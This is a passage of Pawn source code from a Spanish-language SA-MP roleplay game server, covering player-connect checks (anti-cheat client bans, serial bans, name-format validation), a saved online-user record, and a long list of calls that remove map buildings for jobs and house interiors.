	alm(OldIpData, PlayerIP);
	TimeOldIp = GetTickCount();

	if(!strcmp(PlayerPCI, RakSAMP))
	{
	    #if defined _HOST_LINUX_
	    banip_exec(PlayerIP);
	    #else
		BanEx(playerid,"RakSAMP");
		#endif
		return 1;
 	}

	#endif

	if(IsPlayerSerialBanned(playerid))
	{
		Mensaje(playerid, C_GRIS, "Estas baneado completamente del servidor, le aconsejamos no perder el tiempo en reiniciar el router.");
		SetTimerEx("_BanEx2", 800, false, "is", playerid, "Serial Banned");
		return 1;
	}

	// ---===[ General [===---- //

	new
	    Users = Iter_Count(Player);

	if(Users > Record_UsersOn)
	{
	    Record_UsersOn = Users;
	    printf("- Nuevo record de gente Online: %d personas",Users);
	    MensajeTodosF(-1,"- ¡Nuevo record de gente online! "#CINFO"%d JUGADORES",Users);
		getdate(UsersD_2,UsersD_1,UsersD_0);
		gettime(UsersT_0,UsersT_1,UsersT_2);
		ActualizarDatosGenerales();
	}

	new
		Nombre2[24],
		Pos_
	;

	GetPlayerName(playerid, Nombre2, 24);
	Pos_ = strfind(Nombre2, "_");

	if(!Pos_ || Pos_ < 1 || Pos_ > (strlen(Nombre2)-2) || IlegalCharacterName(Nombre2))
	{
	    Mensaje(playerid, 1, "=========================================================");
	    Mensaje(playerid, C_AMARILLO,"Atención: "#CBLANCO"Con ese nombre no puede entrar al servidor. En este modo de juego");
	    MensajeF(playerid,-1,"se intenta imitar al máximo la vida real, y el nombre "#CROJO"%s "#CBLANCO"no es real.", Nombre2);
	    Mensaje(playerid, -1,"Pongase un nombre realista con formato "#CAMARILLO"Nombre_Apellido"#CBLANCO", ejemplo "#CVERDE"Tomas_Fernandez.");
	    Mensaje(playerid, -1,"No se permiten nombres de famosos, como "#CROJO"Jenifer_Lopez.");
	    Mensaje(playerid, -1,"Si su nombre cumple el formato, pero hace burla, o rompe otras reglas serás expulsado por un administrador.");
	    Mensaje(playerid, 1, "=========================================================");
		SetTimerEx("_KickEx2", 1000, false, "i", playerid);
		return 1;
	}

	ValidarMayusculas(playerid, Nombre2, Pos_);
	SetPlayerColor(playerid,C_AZULRARO);

	ResetearVariables(playerid);
	ResetearVariablesEx(playerid);

    CargarGangZones2(playerid);
	CargarPText(playerid);
	RemoveBuilds(playerid);

	SetPlayerVirtualWorld(playerid, 1);
    return 0;
}

stock ActualizarDatosGenerales()
{
    new
		INI:Arch = INI_Open("Datos_generales.ini");

    INI_WriteInt(Arch,"Gente_online",Record_UsersOn);
	INI_WriteInt(Arch,"Data_0",UsersD_0);
	INI_WriteInt(Arch,"Data_1",UsersD_1);
	INI_WriteInt(Arch,"Data_2",UsersD_2);
	INI_WriteInt(Arch,"Tiempo_0",UsersT_0);
	INI_WriteInt(Arch,"Tiempo_1",UsersT_1);
	INI_WriteInt(Arch,"Tiempo_2",UsersT_2);
	INI_WriteInt(Arch,"Cuentas_Registradas", Cuentas_Registradas);
	INI_WriteInt(Arch,"Dinero_Banco", Dinero_Banco);
    INI_Close(Arch);
	return 1;
}

stock ChangeName(playerid, newname[])
{
	SetPlayerName(playerid, newname);
	alm(Nombre[playerid], newname);
	return 1;
}

stock pName(playerid)
{
	return Nombre[playerid];
}

ValidarMayusculas(playerid, Nombre2[], Pos_)
{
	Nombre2[0] = toupper(Nombre2[0]);
	Nombre2[Pos_+1] = toupper(Nombre2[Pos_+1]);

	Loop(i, strlen(Nombre2), 1)
	{
	    if(i != (Pos_+1))
	    {
			Nombre2[i] = tolower(Nombre2[i]);
		}
	}

	alm(Nombre[playerid], Nombre2);
	alm(Nombre_[playerid], Nombre2);

	Nombre_[playerid][Pos_] = ' ';

	#if FIX_SetPlayerName
	SetPlayerName(playerid,Nombre[playerid]);
	#else
	SetPlayerName(playerid,"OTHER_NAME");
	SetPlayerName(playerid,Nombre[playerid]);
	#endif

	return true;
}

stock RemoveBuilds(playerid)
{
	//          TAXISTAS                //
	RemoveBuildingForPlayer(playerid, 5551, 2140.5156, -1735.1406, 15.8906, 0.25);
	RemoveBuildingForPlayer(playerid, 5633, 2089.3594, -1643.9297, 18.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2125.0859, -1748.1328, 16.3984, 0.25);
	RemoveBuildingForPlayer(playerid, 1308, 2110.6953, -1742.5781, 12.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 1412, 2121.3750, -1721.6875, 13.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 1412, 2126.5781, -1722.4688, 13.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 1412, 2131.8438, -1722.6563, 13.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 5410, 2140.5156, -1735.1406, 15.8906, 0.25);
	RemoveBuildingForPlayer(playerid, 1412, 2137.1094, -1722.6563, 13.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 1412, 2142.3125, -1722.6563, 13.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 1412, 2147.5938, -1722.6563, 13.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 1412, 2152.8750, -1722.6563, 13.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 1412, 2158.1484, -1722.6563, 13.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 1412, 2163.4297, -1722.6563, 13.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2167.2188, -1748.1328, 16.3984, 0.25);
	RemoveBuildingForPlayer(playerid, 1308, 2175.3125, -1730.8906, 12.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 1412, 2168.7656, -1722.6563, 13.7031, 0.25);

	//          SILLA ASISTENTE LSPD    //
	RemoveBuildingForPlayer(playerid, 2356, 225.6563, 110.0781, 1002.2031, 0.25);

	//      LVL 2 CAMIONERO         //
	RemoveBuildingForPlayer(playerid, 1412, 2364.1953, -2149.6563, 13.7500, 0.25);
	RemoveBuildingForPlayer(playerid, 1412, 2360.4844, -2146.0313, 13.7500, 0.25);
	RemoveBuildingForPlayer(playerid, 1412, 2368.6406, -2151.4063, 13.7500, 0.25);
	RemoveBuildingForPlayer(playerid, 1412, 2373.9219, -2151.3125, 13.7500, 0.25);
	RemoveBuildingForPlayer(playerid, 1412, 2384.4688, -2151.1328, 13.7500, 0.25);
	RemoveBuildingForPlayer(playerid, 1412, 2379.1953, -2151.2188, 13.7500, 0.25);
	RemoveBuildingForPlayer(playerid, 1412, 2387.0156, -2148.5391, 13.7500, 0.25);
	RemoveBuildingForPlayer(playerid, 985, 2497.4063, 2777.0703, 11.5313, 0.25);
	RemoveBuildingForPlayer(playerid, 986, 2497.4063, 2769.1094, 11.5313, 0.25);
	RemoveBuildingForPlayer(playerid, 7095, 2545.5469, 2751.3828, 11.9609, 0.25);

	//      COSECHADORES            //
	RemoveBuildingForPlayer(playerid, 3338, -170.0313, -1359.1563, 1.5000, 0.25);
	RemoveBuildingForPlayer(playerid, 1454, -333.6953, -1434.8359, 15.4063, 0.25);
	RemoveBuildingForPlayer(playerid, 1454, -328.9688, -1434.8359, 15.1797, 0.25);
	RemoveBuildingForPlayer(playerid, 1454, -323.3828, -1434.8359, 14.9375, 0.25);
	RemoveBuildingForPlayer(playerid, 1454, -315.8438, -1434.8359, 14.7578, 0.25);
	RemoveBuildingForPlayer(playerid, 1454, -307.7344, -1434.8359, 14.1719, 0.25);
	RemoveBuildingForPlayer(playerid, 3244, -170.0313, -1359.1563, 1.5000, 0.25);

	//      CAMPO DE MARIHUANA      //
	RemoveBuildingForPlayer(playerid, 1447, -1005.1094, -1602.4375, 76.6484, 0.25);
	RemoveBuildingForPlayer(playerid, 1412, -1010.1641, -1602.6250, 76.6719, 0.25);
	RemoveBuildingForPlayer(playerid, 1413, -1020.4922, -1602.8594, 76.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 1447, -1015.4297, -1602.6328, 76.7188, 0.25);
	RemoveBuildingForPlayer(playerid, 1412, -1025.7344, -1603.0156, 76.6719, 0.25);
	RemoveBuildingForPlayer(playerid, 1447, -1031.0000, -1603.0234, 76.7188, 0.25);
	RemoveBuildingForPlayer(playerid, 1447, -994.7422, -1601.5625, 76.7578, 0.25);
	RemoveBuildingForPlayer(playerid, 1412, -989.4766, -1601.5547, 76.7578, 0.25);
	RemoveBuildingForPlayer(playerid, 1412, -984.4297, -1601.3203, 76.6719, 0.25);
	RemoveBuildingForPlayer(playerid, 1413, -999.8047, -1601.7891, 76.6797, 0.25);
	RemoveBuildingForPlayer(playerid, 1447, -979.2109, -1601.1875, 76.4375, 0.25);
	RemoveBuildingForPlayer(playerid, 1447, -963.8906, -1601.1875, 76.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 1412, -969.1094, -1601.3203, 76.7109, 0.25);
	RemoveBuildingForPlayer(playerid, 1412, -974.1563, -1601.5547, 76.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 1447, -958.4375, -1601.1875, 77.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1447, -953.1563, -1601.1875, 77.7344, 0.25);
	RemoveBuildingForPlayer(playerid, 3261, -1023.1328, -1632.4609, 75.3594, 0.25);
	RemoveBuildingForPlayer(playerid, 3261, -1023.1328, -1629.2813, 75.3594, 0.25);
	RemoveBuildingForPlayer(playerid, 3261, -1023.1328, -1626.1016, 75.3594, 0.25);
	RemoveBuildingForPlayer(playerid, 3261, -1023.1328, -1622.9766, 75.3594, 0.25);
	RemoveBuildingForPlayer(playerid, 3409, -1023.1328, -1622.2031, 75.3359, 0.25);

	//      INTERIORES (CASAS)      //
	// Int 8 Ex
	RemoveBuildingForPlayer(playerid, 2288, 2373.3828, -1130.4531, 1051.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 2259, 2368.6094, -1122.5078, 1052.0469, 0.25);
	// Int 9 Ex
	RemoveBuildingForPlayer(playerid, 2108, 2192.0547, -1219.5234, 1048.0234, 0.25);
	RemoveBuildingForPlayer(playerid, 2108, 2194.3359, -1219.5234, 1048.0234, 0.25);
	RemoveBuildingForPlayer(playerid, 2328, 2189.4531, -1210.1719, 1048.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 2249, 2190.2188, -1209.3828, 1049.4453, 0.25);
	// Int 14 Ex
	RemoveBuildingForPlayer(playerid, 1703, 2322.2266, -1142.4766, 1049.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 1822, 2323.9297, -1142.2578, 1049.4844, 0.25);
	RemoveBuildingForPlayer(playerid, 1703, 2326.5234, -1140.5703, 1049.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 1703, 2323.4375, -1139.5469, 1049.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 2257, 2320.4141, -1134.6328, 1053.8281, 0.25);
	RemoveBuildingForPlayer(playerid, 2254, 2328.1484, -1134.6172, 1054.0625, 0.25);


	RemoveBuildingForPlayer(playerid, 2865, 2499.5000, -1712.2188, 1014.8672, 0.25);
	RemoveBuildingForPlayer(playerid, 2821, 2500.9297, -1710.3516, 1014.8516, 0.25);
	RemoveBuildingForPlayer(playerid, 1509, 2501.1953, -1710.6953, 1015.0547, 0.25);
	RemoveBuildingForPlayer(playerid, 2277, 2494.7578, -1705.3281, 1018.8984, 0.25);
	RemoveBuildingForPlayer(playerid, 1512, 2500.8906, -1706.5703, 1015.0547, 0.25);
	RemoveBuildingForPlayer(playerid, 1512, 2501.1172, -1705.4766, 1015.0547, 0.25);
	RemoveBuildingForPlayer(playerid, 1509, 2501.1953, -1706.8594, 1015.0547, 0.25);
	RemoveBuildingForPlayer(playerid, 1520, 2501.2969, -1707.2344, 1014.9141, 0.25);
	RemoveBuildingForPlayer(playerid, 1520, 2501.2969, -1707.3594, 1014.9141, 0.25);
	RemoveBuildingForPlayer(playerid, 2830, 2491.8359, -1702.9375, 1014.5703, 0.25);
	RemoveBuildingForPlayer(playerid, 2306, 2491.8359, -1701.2813, 1017.3516, 0.25);
	RemoveBuildingForPlayer(playerid, 2306, 2494.0156, -1701.3125, 1017.3516, 0.25);
	RemoveBuildingForPlayer(playerid, 2247, 2494.1172, -1700.3359, 1018.8203, 0.25);
	RemoveBuildingForPlayer(playerid, 14478, 2494.4297, -1698.3359, 1014.0391, 0.25);
	RemoveBuildingForPlayer(playerid, 1740, 2495.2891, -1704.4922, 1017.3672, 0.25);
	RemoveBuildingForPlayer(playerid, 2816, 2494.8047, -1702.5156, 1018.0469, 0.25);
	RemoveBuildingForPlayer(playerid, 2272, 2496.2188, -1702.5234, 1018.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 14477, 2501.0703, -1697.6172, 1016.1250, 0.25);
	RemoveBuildingForPlayer(playerid, 14490, 2501.0703, -1697.6172, 1016.1250, 0.25);
	RemoveBuildingForPlayer(playerid, 14491, 2501.0703, -1697.6172, 1016.1250, 0.25);
	RemoveBuildingForPlayer(playerid, 2252, 2493.0469, -1697.1875, 1014.5703, 0.25);
	RemoveBuildingForPlayer(playerid, 2827, 2497.6563, -1697.0703, 1014.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 14489, 2490.4453, -1694.8672, 1015.4609, 0.25);
	RemoveBuildingForPlayer(playerid, 2028, 2491.3438, -1694.7656, 1013.8359, 0.25);
	RemoveBuildingForPlayer(playerid, 2528, 232.6328, 1110.5938, 1079.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 2523, 232.6563, 1108.8281, 1079.9922, 0.25);
	RemoveBuildingForPlayer(playerid, 2520, 234.6016, 1109.3828, 1079.9453, 0.25);
	RemoveBuildingForPlayer(playerid, 2522, 235.6016, 1112.2422, 1079.9688, 0.25);
	RemoveBuildingForPlayer(playerid, 2523, 234.7188, 1117.4609, 1083.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 2528, 234.6172, 1119.2266, 1083.9766, 0.25);
	RemoveBuildingForPlayer(playerid, 2520, 237.3438, 1119.1641, 1083.9609, 0.25);
	RemoveBuildingForPlayer(playerid, 2522, 234.6953, 1120.1563, 1083.9297, 0.25);
	RemoveBuildingForPlayer(playerid, 14721, 240.4609, 1114.3906, 1083.2891, 0.25);
	RemoveBuildingForPlayer(playerid, 2240, 26.1563, 1343.2969, 1083.9531, 0.25);
	RemoveBuildingForPlayer(playerid, 2251, 266.4531, 303.3672, 998.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 14867, 270.2813, 302.5547, 999.6797, 0.25);
	RemoveBuildingForPlayer(playerid, 1720, 272.9063, 304.7891, 998.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 14870, 273.1641, 303.1719, 1000.9141, 0.25);
	RemoveBuildingForPlayer(playerid, 2251, 273.9922, 303.3672, 998.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 14868, 274.1328, 304.5078, 1001.1953, 0.25);
	RemoveBuildingForPlayer(playerid, 948, 266.5703, 306.4453, 998.1406, 0.25);
	RemoveBuildingForPlayer(playerid, 14866, 270.1172, 307.6094, 998.7578, 0.25);
	RemoveBuildingForPlayer(playerid, 14869, 273.8125, 305.0156, 998.9531, 0.25);
	RemoveBuildingForPlayer(playerid, 2241, 2194.5469, -1226.4844, 1048.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 2526, 2191.8750, -1225.3594, 1048.0391, 0.25);
	RemoveBuildingForPlayer(playerid, 2523, 2191.8750, -1223.5938, 1048.0234, 0.25);
	RemoveBuildingForPlayer(playerid, 2241, 2194.5469, -1221.7969, 1048.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 2528, 2194.6953, -1223.1172, 1048.0234, 0.25);
	RemoveBuildingForPlayer(playerid, 2278, 2194.6406, -1221.5859, 1050.3203, 0.25);
	RemoveBuildingForPlayer(playerid, 2095, 2186.2109, -1219.1563, 1048.0313, 0.25);
	RemoveBuildingForPlayer(playerid, 2106, 2186.2500, -1220.3203, 1048.8750, 0.25);
	RemoveBuildingForPlayer(playerid, 2106, 2189.5000, -1220.3203, 1048.8750, 0.25);
	RemoveBuildingForPlayer(playerid, 2095, 2189.6250, -1219.1563, 1048.0313, 0.25);
	RemoveBuildingForPlayer(playerid, 2280, 2196.8828, -1219.9688, 1050.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 2088, 2199.1875, -1219.0078, 1048.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 1717, 2187.2422, -1215.6719, 1048.0078, 0.25);
	RemoveBuildingForPlayer(playerid, 2090, 2188.4453, -1217.1797, 1048.0078, 0.25);
	RemoveBuildingForPlayer(playerid, 2088, 2188.4688, -1213.0234, 1048.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 2281, 2196.1484, -1214.6797, 1050.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2298, 2197.2734, -1216.6250, 1048.0234, 0.25);
	RemoveBuildingForPlayer(playerid, 2106, 2197.2500, -1212.8516, 1048.5469, 0.25);
	RemoveBuildingForPlayer(playerid, 2259, 2198.5859, -1213.1484, 1050.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 2828, 2198.5391, -1212.8359, 1048.8203, 0.25);
	RemoveBuildingForPlayer(playerid, 2106, 2199.9375, -1212.8516, 1048.5469, 0.25);
	RemoveBuildingForPlayer(playerid, 2832, 2181.5000, -1206.5234, 1049.0625, 0.25);
	RemoveBuildingForPlayer(playerid, 2134, 2181.6250, -1207.4219, 1048.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 2132, 2181.6328, -1205.4219, 1048.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 2339, 2181.6250, -1206.4219, 1048.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 2131, 2184.6250, -1207.8594, 1048.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 2121, 2183.5625, -1204.2344, 1048.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 2115, 2184.6641, -1204.1719, 1048.0313, 0.25);
	RemoveBuildingForPlayer(playerid, 2299, 2187.6250, -1212.1563, 1048.0078, 0.25);
	RemoveBuildingForPlayer(playerid, 2826, 2186.4531, -1210.5625, 1048.0313, 0.25);
	RemoveBuildingForPlayer(playerid, 2106, 2185.7109, -1209.4063, 1048.7734, 0.25);
	RemoveBuildingForPlayer(playerid, 2259, 2185.3984, -1209.9609, 1050.0859, 0.25);
	RemoveBuildingForPlayer(playerid, 2328, 2186.4375, -1210.1719, 1048.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 2255, 2188.1563, -1209.1406, 1050.2422, 0.25);
	RemoveBuildingForPlayer(playerid, 2121, 2185.8047, -1205.2656, 1048.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 2281, 2187.8516, -1207.1250, 1050.0703, 0.25);
	RemoveBuildingForPlayer(playerid, 2069, 2188.2109, -1207.5703, 1048.0703, 0.25);
	RemoveBuildingForPlayer(playerid, 2280, 2189.8984, -1207.8438, 1050.1172, 0.25);
	RemoveBuildingForPlayer(playerid, 2108, 2192.0547, -1209.7109, 1048.0234, 0.25);
	RemoveBuildingForPlayer(playerid, 2108, 2194.3359, -1209.7109, 1048.0234, 0.25);
	RemoveBuildingForPlayer(playerid, 2826, 2190.5781, -1204.4297, 1048.0313, 0.25);
	RemoveBuildingForPlayer(playerid, 1702, 2191.5781, -1206.9375, 1048.0391, 0.25);
	RemoveBuildingForPlayer(playerid, 2857, 2193.0938, -1204.2813, 1048.5078, 0.25);
	RemoveBuildingForPlayer(playerid, 1818, 2193.1250, -1205.1328, 1048.0078, 0.25);
	RemoveBuildingForPlayer(playerid, 1702, 2196.1484, -1205.3828, 1048.0391, 0.25);
	RemoveBuildingForPlayer(playerid, 2260, 2196.7188, -1206.4922, 1050.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 2831, 2181.5625, -1203.5000, 1049.0703, 0.25);
	RemoveBuildingForPlayer(playerid, 2134, 2181.6250, -1203.4219, 1048.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 2141, 2181.6250, -1201.4219, 1048.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 2339, 2181.6250, -1202.4219, 1048.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 2831, 2184.6016, -1203.8906, 1048.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 2121, 2185.8047, -1202.6094, 1048.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 2121, 2183.3281, -1202.3750, 1048.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 2131, 2183.3750, -1200.8672, 1048.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 15043, 2189.1641, -1203.6484, 1048.0313, 0.25);
	RemoveBuildingForPlayer(playerid, 1717, 2190.5469, -1201.5625, 1048.0078, 0.25);
	RemoveBuildingForPlayer(playerid, 2244, 2188.0000, -1200.8516, 1048.2891, 0.25);
	RemoveBuildingForPlayer(playerid, 2255, 2188.2656, -1200.8438, 1050.1797, 0.25);
	RemoveBuildingForPlayer(playerid, 2126, 2192.4063, -1200.5234, 1048.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 2811, 2192.8359, -1200.0391, 1048.5391, 0.25);
	RemoveBuildingForPlayer(playerid, 15040, 2193.2031, -1199.1094, 1050.1328, 0.25);
	RemoveBuildingForPlayer(playerid, 2100, 2195.2500, -1200.4844, 1048.0234, 0.25);
	RemoveBuildingForPlayer(playerid, 2023, 2305.5547, -1212.6406, 1048.0234, 0.25);
	RemoveBuildingForPlayer(playerid, 1768, 2305.8281, -1210.3750, 1048.0000, 0.25);
	RemoveBuildingForPlayer(playerid, 2076, 2308.7578, -1209.7188, 1051.2500, 0.25);
	RemoveBuildingForPlayer(playerid, 1818, 2308.8438, -1208.9141, 1048.0078, 0.25);
	RemoveBuildingForPlayer(playerid, 1717, 2305.7813, -1207.8125, 1048.0078, 0.25);
	RemoveBuildingForPlayer(playerid, 1764, 2310.9844, -1209.1797, 1048.0078, 0.25);
	RemoveBuildingForPlayer(playerid, 2100, 2311.5547, -1206.6719, 1048.0234, 0.25);
	RemoveBuildingForPlayer(playerid, 15052, 2313.8438, -1212.7344, 1049.5547, 0.25);
	RemoveBuildingForPlayer(playerid, 15056, 2313.8438, -1212.7344, 1049.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 2123, 2312.9609, -1145.0703, 1050.3203, 0.25);
	RemoveBuildingForPlayer(playerid, 2123, 2314.2969, -1146.3125, 1050.3203, 0.25);
	RemoveBuildingForPlayer(playerid, 2123, 2315.4219, -1145.0703, 1050.3203, 0.25);
	RemoveBuildingForPlayer(playerid, 2086, 2314.2734, -1144.8984, 1050.0859, 0.25);
	RemoveBuildingForPlayer(playerid, 2123, 2314.2969, -1143.6250, 1050.3203, 0.25);
	RemoveBuildingForPlayer(playerid, 2138, 2331.3359, -1144.0859, 1049.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 2138, 2335.3594, -1144.0703, 1049.6719, 0.25);
	RemoveBuildingForPlayer(playerid, 2135, 2336.3516, -1144.0781, 1049.6719, 0.25);
	RemoveBuildingForPlayer(playerid, 2305, 2337.3203, -1144.0781, 1049.6719, 0.25);
	RemoveBuildingForPlayer(playerid, 2138, 2331.3359, -1143.1016, 1049.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 2138, 2337.3203, -1143.0938, 1049.6719, 0.25);
	RemoveBuildingForPlayer(playerid, 1741, 2312.6484, -1140.7891, 1053.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 2138, 2331.3359, -1142.1094, 1049.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 2138, 2331.3359, -1141.1172, 1049.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 2079, 2334.4219, -1140.9688, 1050.3359, 0.25);
	RemoveBuildingForPlayer(playerid, 2138, 2337.3203, -1142.1094, 1049.6719, 0.25);
	RemoveBuildingForPlayer(playerid, 2139, 2337.3125, -1141.1094, 1049.6641, 0.25);
	RemoveBuildingForPlayer(playerid, 2088, 2338.4531, -1141.3672, 1053.2734, 0.25);
	RemoveBuildingForPlayer(playerid, 2270, 2340.2734, -1141.7109, 1054.5391, 0.25);
	RemoveBuildingForPlayer(playerid, 15050, 2330.3281, -1140.3047, 1051.9063, 0.25);
	RemoveBuildingForPlayer(playerid, 2138, 2331.3359, -1140.1328, 1049.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 2079, 2333.3281, -1139.8672, 1050.3359, 0.25);
	RemoveBuildingForPlayer(playerid, 2115, 2334.4297, -1139.6250, 1049.7109, 0.25);
	RemoveBuildingForPlayer(playerid, 15049, 2334.3281, -1139.5859, 1051.1953, 0.25);
	RemoveBuildingForPlayer(playerid, 2079, 2335.3672, -1139.8750, 1050.3359, 0.25);
	RemoveBuildingForPlayer(playerid, 2303, 2337.3281, -1140.1172, 1049.6719, 0.25);
	RemoveBuildingForPlayer(playerid, 2090, 2309.5156, -1139.3438, 1053.4219, 0.25);
	RemoveBuildingForPlayer(playerid, 2138, 2331.3359, -1139.1406, 1049.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 2079, 2333.3281, -1138.8281, 1050.3359, 0.25);
	RemoveBuildingForPlayer(playerid, 2079, 2335.3672, -1138.8359, 1050.3359, 0.25);
	RemoveBuildingForPlayer(playerid, 2298, 2336.5391, -1138.7891, 1053.2813, 0.25);
	RemoveBuildingForPlayer(playerid, 2138, 2331.3359, -1138.1563, 1049.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 2136, 2337.3281, -1138.1328, 1049.6719, 0.25);
	RemoveBuildingForPlayer(playerid, 2240, 2319.2500, -1137.8750, 1050.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 2240, 2329.5000, -1137.8750, 1050.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 2138, 2331.3359, -1137.1641, 1049.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 2079, 2334.4219, -1137.5859, 1050.3359, 0.25);
	RemoveBuildingForPlayer(playerid, 2139, 2337.3125, -1137.1484, 1049.6641, 0.25);
	RemoveBuildingForPlayer(playerid, 2088, 2310.6641, -1136.3047, 1053.3672, 0.25);
	RemoveBuildingForPlayer(playerid, 2138, 2331.3359, -1136.1719, 1049.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 2138, 2331.3359, -1135.1875, 1049.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 2281, 2335.2656, -1136.4063, 1054.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 2106, 2336.5156, -1135.0156, 1053.8047, 0.25);
	RemoveBuildingForPlayer(playerid, 2271, 2337.8047, -1135.3516, 1054.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 2138, 2337.3203, -1136.1641, 1049.6719, 0.25);
	RemoveBuildingForPlayer(playerid, 2138, 2337.3203, -1135.1797, 1049.6719, 0.25);
	RemoveBuildingForPlayer(playerid, 2106, 2339.2031, -1135.0156, 1053.8047, 0.25);
	RemoveBuildingForPlayer(playerid, 1731, 2363.5703, -1134.3359, 1052.3516, 0.25);
	RemoveBuildingForPlayer(playerid, 2077, 2357.5469, -1134.1875, 1050.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 2298, 2361.2969, -1134.1484, 1049.8594, 0.25);
	RemoveBuildingForPlayer(playerid, 2141, 2367.5625, -1135.3906, 1049.8750, 0.25);
	RemoveBuildingForPlayer(playerid, 2339, 2367.5625, -1134.3906, 1049.8750, 0.25);
	RemoveBuildingForPlayer(playerid, 2134, 2367.5625, -1133.3906, 1049.8750, 0.25);
	RemoveBuildingForPlayer(playerid, 2077, 2357.5469, -1131.5234, 1050.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 2271, 2357.8594, -1132.8828, 1051.2813, 0.25);
	RemoveBuildingForPlayer(playerid, 2087, 2360.2969, -1129.9766, 1049.8750, 0.25);
	RemoveBuildingForPlayer(playerid, 2103, 2360.8281, -1130.1406, 1051.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 2279, 2369.8125, -1135.4375, 1052.1094, 0.25);
	RemoveBuildingForPlayer(playerid, 2125, 2370.5781, -1134.0313, 1050.1797, 0.25);
	RemoveBuildingForPlayer(playerid, 2125, 2371.7500, -1133.5938, 1050.1797, 0.25);
	RemoveBuildingForPlayer(playerid, 2278, 2372.1875, -1135.4297, 1052.1250, 0.25);
	RemoveBuildingForPlayer(playerid, 2075, 2370.8281, -1132.8750, 1053.4609, 0.25);
	RemoveBuildingForPlayer(playerid, 2030, 2371.2266, -1132.9219, 1050.2734, 0.25);
	RemoveBuildingForPlayer(playerid, 2812, 2371.2969, -1133.0156, 1050.6641, 0.25);
	RemoveBuildingForPlayer(playerid, 2125, 2371.7500, -1131.8594, 1050.1797, 0.25);
	RemoveBuildingForPlayer(playerid, 2125, 2370.5781, -1131.8594, 1050.1797, 0.25);
	RemoveBuildingForPlayer(playerid, 2141, 2374.5000, -1135.3906, 1049.8203, 0.25);
	RemoveBuildingForPlayer(playerid, 2132, 2374.5000, -1131.3906, 1049.8203, 0.25);
	RemoveBuildingForPlayer(playerid, 2339, 2374.5078, -1134.3828, 1049.8203, 0.25);
	RemoveBuildingForPlayer(playerid, 2134, 2374.5078, -1133.3828, 1049.8203, 0.25);
	RemoveBuildingForPlayer(playerid, 2339, 2374.5078, -1130.3828, 1049.8203, 0.25);
	RemoveBuildingForPlayer(playerid, 2225, 2369.1797, -1125.8047, 1049.8672, 0.25);
	RemoveBuildingForPlayer(playerid, 2260, 2369.7188, -1123.8594, 1052.0781, 0.25);
	RemoveBuildingForPlayer(playerid, 2331, 2367.3672, -1123.1563, 1050.1172, 0.25);
	RemoveBuildingForPlayer(playerid, 2302, 2364.5547, -1122.9688, 1049.8672, 0.25);
	RemoveBuildingForPlayer(playerid, 2333, 2367.5703, -1122.1484, 1049.8672, 0.25);
	RemoveBuildingForPlayer(playerid, 2255, 2361.5703, -1122.1484, 1052.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 1734, 2364.8828, -1122.0469, 1053.8516, 0.25);
